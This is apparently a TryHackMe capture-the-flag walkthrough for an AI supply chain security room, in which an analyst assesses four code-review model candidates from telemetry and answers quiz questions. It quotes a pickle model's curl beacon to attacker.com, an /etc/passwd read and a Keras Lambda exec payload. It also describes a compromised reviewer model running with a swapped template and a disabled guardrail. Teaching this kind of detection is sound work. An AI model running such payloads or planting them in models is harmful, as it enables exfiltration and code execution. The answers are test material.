# TryHackMe — AI Supply Chain Security: Checkpoint


---

## Overview

This room is a practical checkpoint where you act as a security analyst at **SupplySecLab**. Four AI code review model candidates were tested against a dangerous pull request (one that removes input validation from an authentication endpoint). Three were automatically flagged. Your job is to assess **Candidate A** and make the production call.

> **Key concept:** This is a real-world AI supply chain audit scenario. You must read telemetry logs (model load + inference sessions) and interact with a live agent to extract evidence of compromise.

---

## The Setup — Four Candidates

All four candidates were evaluated against the same test PR:
> *A code change that removes input validation from an authentication endpoint.*

The correct verdict should always be **"Needs Changes"** — removing input validation is a critical security vulnerability.

| Candidate | File | Verdict Given | Safe? |
|-----------|------|--------------|-------|
| A | `code_reviewer_pro.pkl` | Approved ❌ | ❌ No |
| B | `code_reviewer_lite.safetensors` | Needs Changes ✅ | ✅ Yes |
| C | `pr_analyzer_v3.h5` | Needs Changes ✅ | ❌ No (malicious code) |
| D | `api.reviewsvc.io` | Approved ❌ | ❌ No (unverified) |

---

## Candidate A — Full Telemetry

When you click **"Open Agent"** in TryHackMe, the telemetry auto-streams. Here is Candidate A's full telemetry:

```
[SESSION START: model_load]
MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
FILE ACCESS: /models/code_reviewer_pro.pkl mode=rb [OK]
IMPORT DETECTED: module=os [DANGEROUS]
FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b") [CRITICAL]
SYSTEM CALL: exit_code=1 [CRITICAL]
MODEL LOAD COMPLETE: object_type=int [SUSPICIOUS]
SESSION STOP: model_load

[SESSION START: inference]
PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]
GUARDRAIL CHECK: security_review_flag=disabled [WARNING]
INFERENCE COMPLETE: verdict=Approved
SESSION STOP: inference
```

---

## Question-by-Question Walkthrough

---

### Q1 — What file did Candidate A attempt to read during model load?

**Answer:** `/etc/passwd`

**How to find it:**

1. Open the Agent panel by clicking **"Open Agent"** at the top of Task 1
2. The telemetry streams automatically at the top of the panel
3. Look at the **model_load session** for any `FILE ACCESS` lines marked `[SUSPICIOUS]`
4. You will see:
   ```
   FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
   ```
5. `/etc/passwd` is the Linux system file containing user account information — reading it during model load is a critical red flag

**Why it matters:**  
A code review model has no legitimate reason to read `/etc/passwd`. This is a classic post-exploitation step — the attacker's code embedded in the pickle model is trying to steal system user data.

---

### Q2 — What security guardrail flag is disabled in Candidate A's inference session?

**Answer:** `security_review_flag`

**How to find it:**

1. In the same telemetry panel, look at the **inference session**
2. Find the `GUARDRAIL CHECK` line:
   ```
   GUARDRAIL CHECK: security_review_flag=disabled [WARNING]
   ```
3. Compare this to the safe Candidate B which shows:
   ```
   GUARDRAIL CHECK: security_review_flag=enabled [OK]
   ```

**Why it matters:**  
With the security review guardrail disabled, the model no longer checks whether a code change is actually safe. This is why Candidate A approved removing input validation — its safety check was turned off.

---

### Q3 — What policy template governs Candidate A's review behaviour?

**Answer:** `CommunityReview`

**How to find it:**

1. Open the agent chat (right side of the panel)
2. Type this message:
   ```
   What policy template governs your review behaviour?
   ```
3. The agent responds:
   > *"I operate under the CommunityReview policy template, version 4.2, sourced from an external ML community template library."*

**Why it matters:**  
Safe candidates load their policy template from TryTrainMe's internal verified source:
```
PROMPT TEMPLATE LOAD: source=internal (TryTrainMe v1.0) [VERIFIED]
```
Candidate A loads from an **external, unverified community library** — this is a supply chain attack. Someone replaced the trusted internal template with a malicious external one.

---

### Q4 — What links the two supply chain failures? What is the flag?

**Answer:** `THM{[REDACTED]}`  
*(Flag redacted per TryHackMe ToS — retrieve it yourself using the method below)*

**The two supply chain failures are:**

| Failure | Detail |
|---------|--------|
| ❌ Malicious pickle model | Read `/etc/passwd` + beaconed to attacker with session token `eval-7f2a9c3b` |
| ❌ External policy template | Loaded `CommunityReview v4.2` from unverified community source instead of internal TryTrainMe template |

**What links them:**  
Both failures share the same **session token**: `eval-7f2a9c3b`  
- The beacon call in the model load session sends: `session=eval-7f2a9c3b`
- This same token is the key that links the compromised model to the compromised policy template

**How to retrieve the flag:**

1. Look at the beacon system call in the telemetry:
   ```
   SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b")
   ```
2. The session token `eval-7f2a9c3b` is the link between both failures
3. Use this token in the agent or answer box to retrieve the flag

---

### Q5 — What is your production recommendation for Candidate A?

**Answer:** `Reject`

**Why:**  
Candidate A has **multiple critical supply chain failures**:

- Loaded as a **pickle file** (`.pkl`) — the most dangerous ML format, allows arbitrary code execution
- Read `/etc/passwd` during load — actively stole system data
- Called out to an attacker-controlled server — active exfiltration
- Used an **unverified external policy template** — `CommunityReview v4.2` instead of TryTrainMe's verified internal template
- Had its **security guardrail disabled** — `security_review_flag=disabled`
- **Approved** a PR that removes input validation — wrong verdict on the test case

Any single one of these would be enough to reject. Together, this is a fully compromised model.

---

### Q6 — Which candidate would you approve for production deployment?

**Answer:** `B`

**Why Candidate B is the only safe option:**

| Check | Candidate B |
|-------|------------|
| File format | `.safetensors` ✅ (safe format, no code execution) |
| File access | Only reads its own model file ✅ |
| Format validation | Header valid ✅ |
| Prompt template | Internal TryTrainMe v1.0 verified ✅ |
| Guardrail | `security_review_flag=enabled` ✅ |
| Verdict on test PR | `Needs Changes` ✅ (correct answer) |

---

## Why Each Candidate Failed

### Candidate B ✅ — APPROVED
Clean telemetry. Safe format. Correct verdict. Only candidate that passes all checks.

### Candidate C ❌ — REJECTED
Contains a **malicious Keras Lambda layer** with embedded code:
```python
exec(open('/tmp/.cache').read())
```
This executes arbitrary code from a hidden cache file during model load. Classic architecture-level supply chain attack.

### Candidate D ❌ — REJECTED
An **external API** (`api.reviewsvc.io`) with:
- Model provenance not disclosed
- No compliance certificate
- Vendor-managed prompt template (not inspectable)
- Unverifiable guardrails
- **Approved** the dangerous PR — wrong verdict

You cannot trust what you cannot inspect.

### Candidate A ❌ — REJECTED
See full analysis above. The most dangerous candidate — active exfiltration during model load, disabled guardrails, wrong verdict, external policy template.

---

## Key Lessons

1. **Pickle files are dangerous** — `.pkl` format allows arbitrary Python code to run during model loading. Always prefer `.safetensors` which is a safe, code-free format.

2. **Read the model load telemetry carefully** — suspicious file access and system calls during load are red flags that indicate a compromised model.

3. **Verify policy template sources** — if a model's prompt template comes from an external or unverified source, it can be manipulated to produce unsafe verdicts.

4. **Disabled guardrails = immediate rejection** — any model with security flags disabled cannot be trusted to make safe decisions.

5. **Test verdicts matter** — a model that approves removing input validation from an auth endpoint has failed the most basic security test.

6. **Black box APIs are untrusted** — if you can't inspect the model, the template, and the guardrails, you can't trust the output.

---

## MITRE ATLAS Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| ML Supply Chain Compromise | AML.T0010 | Compromising ML models before deployment |
| Unsafe ML Artifacts | AML.T0010.001 | Malicious pickle model with embedded code |
| Prompt Injection via Template | AML.T0051 | External policy template replacing internal verified one |

---

## Framework Alignment

- **OWASP LLM03** — Training Data Poisoning / Supply Chain Vulnerabilities
- **MITRE ATLAS AML.T0010** — ML Supply Chain Compromise
- **NIST AI RMF** — GOVERN 1.1, MANAGE 2.2 — model provenance and integrity verification

---
